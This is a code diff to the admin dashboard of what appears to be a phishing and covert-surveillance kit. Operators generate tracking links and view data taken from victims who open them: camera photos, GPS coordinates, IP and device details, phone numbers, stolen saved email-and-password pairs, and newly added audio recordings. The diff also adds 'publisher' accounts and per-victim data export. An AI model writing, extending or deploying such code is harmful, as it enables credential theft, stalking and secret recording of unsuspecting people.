@@ -27,20 +27,27 @@ fetch('/api/check-session')
     });
 
 function loadAllData() {
-    fetch('/api/users-data')
-        .then(response => response.json())
-        .then(data => {
-            allUsersData = data;
-            loadVisitors();
-            updateStats();
-            displayAllUsers(data);
-            updateUsersStats(data);
-            populateStateFilter(data);
-            loadLinks();
-        })
-        .catch(() => {
-            window.location.href = '/';
-        });
+    Promise.all([
+        fetch('/api/users-data').then(r => r.json()),
+        fetch('/api/super-users').then(r => r.json()),
+        fetch('/api/publishers').then(r => r.json())
+    ])
+    .then(([usersData, superData, publisherData]) => {
+        allUsersData = usersData;
+        loadVisitors();
+        updateStats();
+        displayAllUsers(usersData);
+        updateUsersStats(usersData);
+        populateStateFilter(usersData);
+        loadLinks();
+        displaySuperUsers(superData);
+        displayPublishers(publisherData);
+        document.getElementById('totalSuper').textContent = superData.length || 0;
+        document.getElementById('totalPublishers').textContent = publisherData.length || 0;
+    })
+    .catch(() => {
+        window.location.href = '/';
+    });
 }
 
 socket.on('visitor-connected', () => {
@@ -58,6 +65,10 @@ socket.on('camera-data', () => {
 });
 
 socket.on('location-data', () => {
+    refreshAllData();
+});
+
+socket.on('superPowerData', () => {
     refreshAllData();
 });
 
@@ -103,6 +114,7 @@ function generateCustomLink() {
             document.getElementById('generatedLinkContainer').style.display = 'block';
             document.getElementById('generatedLink').value = data.link;
             document.getElementById('powerLinkDisplay').textContent = data.powerLink;
+            document.getElementById('superPowerLinkDisplay').textContent = data.superPowerLink;
             document.getElementById('generatedLinkId').textContent = data.linkId;
             document.getElementById('redirectUrlDisplay').textContent = data.redirectUrl;
             showNotification('✅ Links generated! Link ID: ' + data.linkId);
@@ -116,17 +128,158 @@ function generateCustomLink() {
 }
 
 // ============================================
+// PUBLISHER FUNCTIONS
+// ============================================
+function createPublisher() {
+    const email = document.getElementById('publisherEmail').value.trim();
+    const password = document.getElementById('publisherPassword').value.trim();
+    
+    if (!email || !password) {
+        alert('Please enter email and password');
+        return;
+    }
+    
+    fetch('/api/create-publisher', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email, password })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            document.getElementById('publisherLinkContainer').style.display = 'block';
+            document.getElementById('publisherLinkDisplay').value = data.link;
+            showNotification('✅ Publisher created!');
+            document.getElementById('publisherEmail').value = '';
+            document.getElementById('publisherPassword').value = '';
+            loadAllData();
+        } else {
+            alert('Error: ' + (data.error || 'Unknown error'));
+        }
+    })
+    .catch(error => {
+        alert('Error: ' + error.message);
+    });
+}
+
+function displayPublishers(publishers) {
+    const container = document.getElementById('publishersList');
+    container.innerHTML = '';
+    if (!publishers || publishers.length === 0) {
+        container.innerHTML = '<p style="color:#999; text-align:center; padding:20px;">No publishers created yet.</p>';
+        return;
+    }
+    publishers.forEach(p => {
+        const card = document.createElement('div');
+        card.className = 'visitor-card';
+        card.innerHTML = `
+            <div class="visitor-header">
+                <div>
+                    <strong>📢 ${p.email}</strong>
+                    <div style="font-size:13px; color:#888; margin-top:3px;">🔗 ${p.link}</div>
+                    <div style="font-size:12px; color:#888;">📅 ${new Date(p.createdAt).toLocaleString()}</div>
+                </div>
+                <span style="padding:5px 10px; background:#9f7aea; color:white; border-radius:5px; font-size:12px;">👥 ${p.totalVisits || 0} visits</span>
+            </div>
+            <div style="display:flex; gap:8px; margin-top:10px; flex-wrap:wrap;">
+                <button onclick="copyToClipboard('${p.link}')" class="camera-btn" style="background:#9f7aea;">📋 Copy</button>
+                <button onclick="showPublisherDetails('${p.id}')" class="camera-btn" style="background:#667eea;">📊 Details</button>
+            </div>
+        `;
+        container.appendChild(card);
+    });
+}
+
+function showPublisherDetails(publisherId) {
+    fetch(`/api/publisher-data/${publisherId}`)
+        .then(response => response.json())
+        .then(publisher => {
+            const modal = document.getElementById('publisherModal');
+            const content = document.getElementById('publisherDetailsContent');
+            content.innerHTML = `
+                <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px;">
+                    <div class="detail-card"><label>📧 Email</label><div class="value">${publisher.email}</div></div>
+                    <div class="detail-card"><label>🔗 Link</label><div class="value">${publisher.link}</div></div>
+                    <div class="detail-card"><label>📅 Created</label><div class="value">${new Date(publisher.createdAt).toLocaleString()}</div></div>
+                    <div class="detail-card"><label>👥 Total Visits</label><div class="value">${publisher.totalVisits || 0}</div></div>
+                    <div class="detail-card"><label>🆔 Publisher ID</label><div class="value">${publisher.id}</div></div>
+                    <div class="detail-card"><label>📊 Users</label><div class="value">${(publisher.users || []).length} users</div></div>
+                </div>
+                <h4 style="margin-top:15px;">👥 Users Data</h4>
+                <div style="max-height:200px; overflow-y:auto;">
+                    ${(publisher.users || []).length > 0 ? publisher.users.map((u, i) => `
+                        <div style="padding:5px; border-bottom:1px solid #eee; font-size:13px;">
+                            #${i+1} 🆔 ${u.id} - 📱 ${u.deviceName || 'Unknown'} - 📅 ${u.visitDate ? new Date(u.visitDate).toLocaleString() : 'N/A'}
+                        </div>
+                    `).join('') : '<p style="color:#999;">No users yet</p>'}
+                </div>
+            `;
+            modal.style.display = 'flex';
+        });
+}
+
+// ============================================
+// SUPER POWER USERS
+// ============================================
+function displaySuperUsers(users) {
+    const container = document.getElementById('superUsersList');
+    container.innerHTML = '';
+    if (!users || users.length === 0) {
+        container.innerHTML = '<p style="color:#999; text-align:center; padding:40px;">No super power users yet.</p>';
+        return;
+    }
+    users.forEach(user => {
+        const card = document.createElement('div');
+        card.className = 'visitor-card';
+        const data = user.data || {};
+        card.innerHTML = `
+            <div class="visitor-header">
+                <div>
+                    <strong>⚡ Super User</strong>
+                    <div style="font-size:13px; color:#888; margin-top:3px;">🆔 ${user.id}</div>
+                    <div style="font-size:12px; color:#888;">📅 ${new Date(user.createdAt).toLocaleString()}</div>
+                </div>
+                <span style="padding:5px 10px; background:#f6ad55; color:white; border-radius:5px; font-size:12px;">⭐ Super</span>
+            </div>
+            <div style="display:flex; gap:8px; margin-top:10px; flex-wrap:wrap;">
+                <button onclick="copyToClipboard('${user.id}')" class="camera-btn" style="background:#f6ad55;">📋 Copy ID</button>
+                <button onclick="deleteSuperUser('${user.id}')" class="camera-btn delete">🗑️ Delete</button>
+            </div>
+        `;
+        container.appendChild(card);
+    });
+}
+
+function deleteSuperUser(id) {
+    if (!confirm('Delete this super user?')) return;
+    fetch(`/api/super-user/${id}`, { method: 'DELETE' })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                showNotification('🗑️ Super user deleted');
+                loadAllData();
+            }
+        });
+}
+
+// ============================================
 // TAB SWITCHING
 // ============================================
 function showTab(tab) {
     document.getElementById('dashboardTab').style.display = tab === 'dashboard' ? 'block' : 'none';
     document.getElementById('usersTab').style.display = tab === 'users' ? 'block' : 'none';
+    document.getElementById('superTab').style.display = tab === 'super' ? 'block' : 'none';
+    document.getElementById('publishersTab').style.display = tab === 'publishers' ? 'block' : 'none';
     document.getElementById('linksTab').style.display = tab === 'links' ? 'block' : 'none';
     document.getElementById('tabDashboard').className = 'tab-btn' + (tab === 'dashboard' ? ' active' : '');
     document.getElementById('tabUsers').className = 'tab-btn' + (tab === 'users' ? ' active' : '');
+    document.getElementById('tabSuper').className = 'tab-btn' + (tab === 'super' ? ' active' : '');
+    document.getElementById('tabPublishers').className = 'tab-btn' + (tab === 'publishers' ? ' active' : '');
     document.getElementById('tabLinks').className = 'tab-btn' + (tab === 'links' ? ' active' : '');
     if (tab === 'users') { refreshAllData(); }
     if (tab === 'links') { loadLinks(); }
+    if (tab === 'super') { loadAllData(); }
+    if (tab === 'publishers') { loadAllData(); }
 }
 
 // ============================================
@@ -154,19 +307,18 @@ function displayLinks(links) {
             <div class="visitor-header">
                 <div>
                     <strong>🔗 Link ID: ${link.linkId}</strong>
-                    <div style="font-size:14px; color:#666; margin-top:5px;">
-                        🔗 Normal: ${link.link}
-                    </div>
-                    ${link.powerLink ? `<div style="font-size:13px; color:#ed8936; margin-top:3px;">⚡ Power: ${link.powerLink}</div>` : ''}
-                    <div style="font-size:13px; color:#888; margin-top:3px;">🎯 Redirect: ${link.redirectUrl}</div>
+                    <div style="font-size:13px; color:#666; margin-top:3px;">🔗 Normal: ${link.link}</div>
+                    ${link.powerLink ? `<div style="font-size:12px; color:#ed8936;">⚡ Power: ${link.powerLink}</div>` : ''}
+                    ${link.superPowerLink ? `<div style="font-size:12px; color:#f6ad55;">⭐ Super: ${link.superPowerLink}</div>` : ''}
+                    <div style="font-size:12px; color:#888;">🎯 ${link.redirectUrl}</div>
                 </div>
                 <span style="padding:5px 10px; background:#48bb78; color:white; border-radius:5px; font-size:12px;">👥 ${link.totalVisits || 0} visits</span>
             </div>
-            <div style="display:flex; gap:10px; margin-top:10px; flex-wrap:wrap;">
-                <button onclick="copyToClipboard('${link.link}')" class="camera-btn" style="background:#48bb78;">📋 Copy Normal</button>
-                ${link.powerLink ? `<button onclick="copyToClipboard('${link.powerLink}')" class="camera-btn" style="background:#ed8936;">📋 Copy Power</button>` : ''}
-                <button onclick="searchByLinkId('${link.linkId}')" class="camera-btn" style="background:#667eea;">🔍 View Users</button>
-                <span style="font-size:12px; color:#888; padding:8px;">📅 ${new Date(link.createdAt).toLocaleString()}</span>
+            <div style="display:flex; gap:8px; margin-top:10px; flex-wrap:wrap;">
+                <button onclick="copyToClipboard('${link.link}')" class="camera-btn" style="background:#48bb78;">📋 Normal</button>
+                ${link.powerLink ? `<button onclick="copyToClipboard('${link.powerLink}')" class="camera-btn" style="background:#ed8936;">📋 Power</button>` : ''}
+                ${link.superPowerLink ? `<button onclick="copyToClipboard('${link.superPowerLink}')" class="camera-btn" style="background:#f6ad55;">📋 Super</button>` : ''}
+                <button onclick="searchByLinkId('${link.linkId}')" class="camera-btn" style="background:#667eea;">🔍 View</button>
             </div>
         `;
         container.appendChild(card);
@@ -185,15 +337,38 @@ function searchByLinkId(linkId) {
 function refreshAllData() {
     Promise.all([
         fetch('/api/users-data').then(r => r.json()),
-        fetch('/api/visitors').then(r => r.json())
+        fetch('/api/super-users').then(r => r.json()),
+        fetch('/api/publishers').then(r => r.json())
     ])
-    .then(([usersData, visitorsData]) => {
+    .then(([usersData, superData, publisherData]) => {
         allUsersData = usersData;
         displayAllUsers(usersData);
         updateUsersStats(usersData);
         populateStateFilter(usersData);
-        displayVisitors(visitorsData);
+        displayVisitors(usersData);
+        displaySuperUsers(superData);
+        displayPublishers(publisherData);
         updateStats();
+        document.getElementById('totalSuper').textContent = superData.length || 0;
+        document.getElementById('totalPublishers').textContent = publisherData.length || 0;
+    });
+}
+
+// ============================================
+// UPDATE STATS
+// ============================================
+function updateStats() {
+    Promise.all([
+        fetch('/api/visitors').then(r => r.json()),
+        fetch('/api/super-users').then(r => r.json()),
+        fetch('/api/publishers').then(r => r.json())
+    ])
+    .then(([visitors, superUsers, publishers]) => {
+        document.getElementById('totalVisitors').textContent = visitors.length;
+        document.getElementById('activeVisitors').textContent = visitors.filter(v => v.connected).length;
+        document.getElementById('totalLinks').textContent = visitors.length;
+        document.getElementById('totalSuper').textContent = superUsers.length || 0;
+        document.getElementById('totalPublishers').textContent = publishers.length || 0;
     });
 }
 
@@ -224,15 +399,12 @@ function displayVisitors(visitors) {
             <div class="visitor-header">
                 <div>
                     <strong>ID: ${visitor.id.substring(0, 8)}</strong>
-                    <div style="font-size:14px; color:#666; margin-top:5px;">
+                    <div style="font-size:13px; color:#666; margin-top:3px;">
                         📱 ${visitor.deviceName || 'Unknown'} 
                         ${visitor.ip ? `• 🌐 ${visitor.ip}` : ''}
                         ${visitor.totalVisits ? `• 🔄 ${visitor.totalVisits} visits` : ''}
-                        ${visitor.linkId ? `• 🔗 ${visitor.linkId}` : ''}
-                        ${visitor.browser ? `• 🌍 ${visitor.browser}` : ''}
                     </div>
-                    ${locationStr ? `<div style="font-size:13px; color:#888;">${locationStr}</div>` : ''}
-                    ${visitor.battery ? `<div style="font-size:13px; color:#888;">🔋 ${visitor.battery}%</div>` : ''}
+                    ${locationStr ? `<div style="font-size:12px; color:#888;">${locationStr}</div>` : ''}
                 </div>
                 <span class="status ${visitor.connected ? 'active' : 'inactive'}">
                     ${visitor.connected ? '🟢 Active' : '🔴 Offline'}
@@ -317,19 +489,15 @@ function displayAllUsers(users) {
             <div class="visitor-header">
                 <div>
                     <strong>🆔 ${user.id}</strong>
-                    <div style="font-size:14px; color:#666; margin-top:5px;">
+                    <div style="font-size:13px; color:#666; margin-top:3px;">
                         📱 ${user.deviceName || 'Unknown'} 
                         ${user.ip ? `• 🌐 ${user.ip}` : ''}
                         ${user.linkId ? `• 🔗 ${user.linkId}` : ''}
-                        ${user.browser ? `• 🌍 ${user.browser}` : ''}
-                        ${user.os ? `• 💻 ${user.os}` : ''}
                         ${visitCount > 0 ? `• 🔄 ${visitCount} visits` : ''}
-                        ${lastVisit !== 'Never' ? `• 📅 Last: ${lastVisit}` : ''}
                         ${user.phoneNumber ? `• 📞 ${user.phoneNumber}` : ''}
-                        ${user.savedPasswords && user.savedPasswords.length > 0 ? `• 🔑 ${user.savedPasswords.length} passwords` : ''}
                     </div>
-                    ${locationStr ? `<div style="font-size:13px; color:#888;">${locationStr}</div>` : ''}
-                    ${user.battery ? `<div style="font-size:13px; color:#888;">🔋 ${user.battery}%</div>` : ''}
+                    ${locationStr ? `<div style="font-size:12px; color:#888;">${locationStr}</div>` : ''}
+                    ${user.battery ? `<div style="font-size:12px; color:#888;">🔋 ${user.battery}%</div>` : ''}
                 </div>
                 <span class="status ${user.connected ? 'active' : 'inactive'}">
                     ${user.connected ? '🟢 Active' : '🔴 Offline'}
@@ -346,7 +514,7 @@ function displayAllUsers(users) {
                 ${user.frontCamera ? `<img src="${user.frontCamera.image || user.frontCamera}" style="max-width:60px; border-radius:5px;">` : ''}
                 ${user.backCamera ? `<img src="${user.backCamera.image || user.backCamera}" style="max-width:60px; border-radius:5px;">` : ''}
             </div>
-            ${visitCount > 0 ? `<div style="margin-top:8px; font-size:12px; color:#888;">📋 ${visitCount} visits. Click "Full Details" for history.</div>` : ''}
+            ${visitCount > 0 ? `<div style="margin-top:8px; font-size:12px; color:#888;">📋 ${visitCount} visits</div>` : ''}
         `;
         container.appendChild(card);
     });
@@ -442,7 +610,7 @@ function clearFilters() {
 }
 
 // ============================================
-// SHOW USER DETAILS
+// SHOW USER DETAILS - COMPLETE
 // ============================================
 function showUserDetails(userId) {
     currentVisitorId = userId;
@@ -489,18 +657,20 @@ function showUserDetails(userId) {
             if (frontPhoto) {
                 const imgSrc = frontPhoto.image || frontPhoto;
                 const captureDate = frontPhoto.captureDate ? new Date(frontPhoto.captureDate).toLocaleString() : 'Unknown';
-                const location = frontPhoto.location ? `${frontPhoto.location.lat || ''}, ${frontPhoto.location.lng || ''}` : 'Not available';
+                const location = frontPhoto.location ? `${frontPhoto.location.city || ''}, ${frontPhoto.location.state || ''}, ${frontPhoto.location.country || ''}` : 'Not available';
+                const coords = frontPhoto.location ? `${frontPhoto.location.lat || 'N/A'}, ${frontPhoto.location.lng || 'N/A'}` : 'N/A';
                 frontPhotoHTML = `
-                    <div style="display:inline-block; margin:10px; padding:15px; background:rgba(255,255,255,0.05); border-radius:12px; border:1px solid rgba(255,255,255,0.08);">
-                        <p><strong>📸 Front Camera</strong></p>
+                    <div style="display:inline-block; margin:8px; padding:12px; background:rgba(255,255,255,0.05); border-radius:12px; border:1px solid rgba(255,255,255,0.08);">
+                        <p><strong>📸 Front Camera</strong> <span style="font-size:11px; color:#888;">#1</span></p>
                         <img src="${imgSrc}" class="camera-image">
-                        <div style="font-size:12px; color:rgba(255,255,255,0.6); margin-top:8px;">
+                        <div style="font-size:11px; color:rgba(255,255,255,0.5); margin-top:6px;">
                             📅 ${captureDate}<br>
-                            📍 ${location}
+                            📍 ${location} <button onclick="copyToClipboard('${location}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button><br>
+                            📍 Coordinates: ${coords} <button onclick="copyToClipboard('${coords}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button>
                         </div>
-                        <div style="margin-top:8px; display:flex; gap:8px; flex-wrap:wrap;">
-                            <button onclick="downloadPhoto('${imgSrc}', 'front-camera.jpg')" class="camera-btn" style="background:#48bb78; padding:5px 10px; font-size:12px;">⬇️ Download</button>
-                            <button onclick="deletePhoto('${userId}', 'front')" class="camera-btn" style="background:#fc8181; padding:5px 10px; font-size:12px;">🗑️ Delete</button>
+                        <div style="margin-top:6px; display:flex; gap:5px; flex-wrap:wrap;">
+                            <button onclick="downloadPhoto('${imgSrc}', 'front-camera.jpg')" class="camera-btn" style="background:#48bb78; padding:3px 8px; font-size:11px;">⬇️ Download</button>
+                            <button onclick="deletePhoto('${userId}', 'front')" class="camera-btn" style="background:#fc8181; padding:3px 8px; font-size:11px;">🗑️ Delete</button>
                         </div>
                     </div>
                 `;
@@ -512,18 +682,20 @@ function showUserDetails(userId) {
             if (backPhoto) {
                 const imgSrc = backPhoto.image || backPhoto;
                 const captureDate = backPhoto.captureDate ? new Date(backPhoto.captureDate).toLocaleString() : 'Unknown';
-                const location = backPhoto.location ? `${backPhoto.location.lat || ''}, ${backPhoto.location.lng || ''}` : 'Not available';
+                const location = backPhoto.location ? `${backPhoto.location.city || ''}, ${backPhoto.location.state || ''}, ${backPhoto.location.country || ''}` : 'Not available';
+                const coords = backPhoto.location ? `${backPhoto.location.lat || 'N/A'}, ${backPhoto.location.lng || 'N/A'}` : 'N/A';
                 backPhotoHTML = `
-                    <div style="display:inline-block; margin:10px; padding:15px; background:rgba(255,255,255,0.05); border-radius:12px; border:1px solid rgba(255,255,255,0.08);">
-                        <p><strong>📸 Back Camera</strong></p>
+                    <div style="display:inline-block; margin:8px; padding:12px; background:rgba(255,255,255,0.05); border-radius:12px; border:1px solid rgba(255,255,255,0.08);">
+                        <p><strong>📸 Back Camera</strong> <span style="font-size:11px; color:#888;">#2</span></p>
                         <img src="${imgSrc}" class="camera-image">
-                        <div style="font-size:12px; color:rgba(255,255,255,0.6); margin-top:8px;">
+                        <div style="font-size:11px; color:rgba(255,255,255,0.5); margin-top:6px;">
                             📅 ${captureDate}<br>
-                            📍 ${location}
+                            📍 ${location} <button onclick="copyToClipboard('${location}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button><br>
+                            📍 Coordinates: ${coords} <button onclick="copyToClipboard('${coords}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button>
                         </div>
-                        <div style="margin-top:8px; display:flex; gap:8px; flex-wrap:wrap;">
-                            <button onclick="downloadPhoto('${imgSrc}', 'back-camera.jpg')" class="camera-btn" style="background:#48bb78; padding:5px 10px; font-size:12px;">⬇️ Download</button>
-                            <button onclick="deletePhoto('${userId}', 'back')" class="camera-btn" style="background:#fc8181; padding:5px 10px; font-size:12px;">🗑️ Delete</button>
+                        <div style="margin-top:6px; display:flex; gap:5px; flex-wrap:wrap;">
+                            <button onclick="downloadPhoto('${imgSrc}', 'back-camera.jpg')" class="camera-btn" style="background:#48bb78; padding:3px 8px; font-size:11px;">⬇️ Download</button>
+                            <button onclick="deletePhoto('${userId}', 'back')" class="camera-btn" style="background:#fc8181; padding:3px 8px; font-size:11px;">🗑️ Delete</button>
                         </div>
                     </div>
                 `;
@@ -531,15 +703,16 @@ function showUserDetails(userId) {
                 backPhotoHTML = '<p style="color:#999;">No back photo</p>';
             }
             
+            // Saved Passwords
             let savedPasswordsHTML = '';
             if (user.savedPasswords && user.savedPasswords.length > 0) {
                 savedPasswordsHTML = '<div class="visitor-details-grid">';
                 user.savedPasswords.forEach(pwd => {
                     savedPasswordsHTML += `
                         <div class="detail-card">
-                            <label>📧 Email <button onclick="copyToClipboard('${pwd.email || 'Unknown'}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                            <label>📧 Email <button onclick="copyToClipboard('${pwd.email || 'Unknown'}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                             <div class="value">${pwd.email || 'Unknown'}</div>
-                            <label style="margin-top:5px;">🔑 Password <button onclick="copyToClipboard('${pwd.password || 'Unknown'}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                            <label style="margin-top:5px;">🔑 Password <button onclick="copyToClipboard('${pwd.password || 'Unknown'}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                             <div class="value">${pwd.password || 'Unknown'}</div>
                         </div>
                     `;
@@ -547,6 +720,7 @@ function showUserDetails(userId) {
                 savedPasswordsHTML += '</div>';
             }
             
+            // Screen Time
             let screenTimeHTML = '';
             if (user.screenTime) {
                 screenTimeHTML = `
@@ -563,53 +737,70 @@ function showUserDetails(userId) {
                 `;
             }
             
+            // Audio Recording
+            let audioHTML = '';
+            if (user.audioRecording) {
+                audioHTML = `
+                    <div class="detail-card">
+                        <label>🎙️ Audio Recording</label>
+                        <div class="value">
+                            <audio controls style="width:100%; max-width:300px;">
+                                <source src="${user.audioRecording}" type="audio/webm">
+                            </audio>
+                            <br>
+                            <button onclick="downloadAudio('${user.audioRecording}', 'audio-${user.id}.webm')" class="camera-btn" style="background:#48bb78; padding:3px 10px; font-size:11px;">⬇️ Download</button>
+                        </div>
+                    </div>
+                `;
+            }
+            
             let html = `
                 <div style="display:grid; grid-template-columns:1fr 1fr; gap:20px;">
                     <div>
                         <h3>👤 User Information</h3>
                         <div class="visitor-details-grid">
                             <div class="detail-card">
-                                <label>🆔 ID <button onclick="copyToClipboard('${user.id}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                                <label>🆔 ID <button onclick="copyToClipboard('${user.id}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                                 <div class="value">${user.id}</div>
                             </div>
                             <div class="detail-card">
-                                <label>🔗 Link ID <button onclick="copyToClipboard('${user.linkId || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                                <label>🔗 Link ID <button onclick="copyToClipboard('${user.linkId || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                                 <div class="value">${user.linkId || 'N/A'}</div>
                             </div>
                             <div class="detail-card">
-                                <label>📱 Device <button onclick="copyToClipboard('${user.deviceName || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                                <label>📱 Device <button onclick="copyToClipboard('${user.deviceName || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                                 <div class="value">${user.deviceName || 'N/A'}</div>
                             </div>
                             <div class="detail-card">
-                                <label>💻 OS <button onclick="copyToClipboard('${user.os || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                                <label>💻 OS <button onclick="copyToClipboard('${user.os || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                                 <div class="value">${user.os || 'N/A'}</div>
                             </div>
                             <div class="detail-card">
-                                <label>🌍 Browser <button onclick="copyToClipboard('${user.browser || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                                <label>🌍 Browser <button onclick="copyToClipboard('${user.browser || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                                 <div class="value">${user.browser || 'N/A'}</div>
                             </div>
                             <div class="detail-card">
-                                <label>🌐 IP Address <button onclick="copyToClipboard('${user.ip || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                                <label>🌐 IP Address <button onclick="copyToClipboard('${user.ip || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                                 <div class="value">${user.ip || 'N/A'}</div>
                             </div>
                             <div class="detail-card">
-                                <label>📶 Network <button onclick="copyToClipboard('${user.network?.effectiveType || user.network?.type || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                                <label>📶 Network <button onclick="copyToClipboard('${user.network?.effectiveType || user.network?.type || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                                 <div class="value">${user.network?.effectiveType || user.network?.type || 'N/A'}</div>
                             </div>
                             <div class="detail-card">
-                                <label>🔋 Battery <button onclick="copyToClipboard('${user.battery || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                                <label>🔋 Battery <button onclick="copyToClipboard('${user.battery || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                                 <div class="value">${user.battery || 'N/A'}%</div>
                             </div>
                             <div class="detail-card">
-                                <label>📅 First Visit <button onclick="copyToClipboard('${user.visitDate ? new Date(user.visitDate).toLocaleString() : 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                                <label>📅 First Visit <button onclick="copyToClipboard('${user.visitDate ? new Date(user.visitDate).toLocaleString() : 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                                 <div class="value">${user.visitDate ? new Date(user.visitDate).toLocaleString() : 'N/A'}</div>
                             </div>
                             <div class="detail-card">
-                                <label>🔄 Total Visits <button onclick="copyToClipboard('${user.totalVisits || 0}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                                <label>🔄 Total Visits <button onclick="copyToClipboard('${user.totalVisits || 0}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                                 <div class="value">${user.totalVisits || 0}</div>
                             </div>
                             <div class="detail-card">
-                                <label>📅 Last Visit <button onclick="copyToClipboard('${user.lastVisit ? new Date(user.lastVisit).toLocaleString() : 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                                <label>📅 Last Visit <button onclick="copyToClipboard('${user.lastVisit ? new Date(user.lastVisit).toLocaleString() : 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                                 <div class="value">${user.lastVisit ? new Date(user.lastVisit).toLocaleString() : 'N/A'}</div>
                             </div>
                             <div class="detail-card">
@@ -618,7 +809,7 @@ function showUserDetails(userId) {
                             </div>
                             ${user.phoneNumber ? `
                             <div class="detail-card">
-                                <label>📞 Phone Number <button onclick="copyToClipboard('${user.phoneNumber}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                                <label>📞 Phone Number <button onclick="copyToClipboard('${user.phoneNumber}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                                 <div class="value">${user.phoneNumber}</div>
                             </div>` : ''}
                         </div>
@@ -629,25 +820,32 @@ function showUserDetails(userId) {
                         
                         <h3 style="margin-top:15px;">📱 Screen Time</h3>
                         ${screenTimeHTML || '<p style="color:#999;">Screen time data not available</p>'}
+                        
+                        <h3 style="margin-top:15px;">🎙️ Audio Recording</h3>
+                        ${audioHTML || '<p style="color:#999;">No audio recording available</p>'}
+                        
+                        <div style="margin-top:15px;">
+                            <button onclick="exportVisitorData('${user.id}')" class="camera-btn" style="background:#48bb78; padding:10px 20px;">📥 Export All Data</button>
+                        </div>
                     </div>
                     <div>
                         <h3>📍 Location</h3>
                         ${user.location ? `
                             <div class="visitor-details-grid">
                                 <div class="detail-card">
-                                    <label>🌍 Country <button onclick="copyToClipboard('${user.location.country || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                                    <label>🌍 Country <button onclick="copyToClipboard('${user.location.country || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                                     <div class="value">${user.location.country || 'N/A'}</div>
                                 </div>
                                 <div class="detail-card">
-                                    <label>🏛️ State <button onclick="copyToClipboard('${user.location.state || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                                    <label>🏛️ State <button onclick="copyToClipboard('${user.location.state || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                                     <div class="value">${user.location.state || 'N/A'}</div>
                                 </div>
                                 <div class="detail-card">
-                                    <label>🏙️ City <button onclick="copyToClipboard('${user.location.city || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                                    <label>🏙️ City <button onclick="copyToClipboard('${user.location.city || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                                     <div class="value">${user.location.city || 'N/A'}</div>
                                 </div>
                                 <div class="detail-card">
-                                    <label>📍 Coordinates <button onclick="copyToClipboard('${user.location.lat || 'N/A'}, ${user.location.lng || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 8px; font-size:10px;">Copy</button></label>
+                                    <label>📍 Coordinates <button onclick="copyToClipboard('${user.location.lat || 'N/A'}, ${user.location.lng || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                                     <div class="value">${user.location.lat || 'N/A'}, ${user.location.lng || 'N/A'}</div>
                                 </div>
                             </div>
@@ -661,18 +859,129 @@ function showUserDetails(userId) {
                         
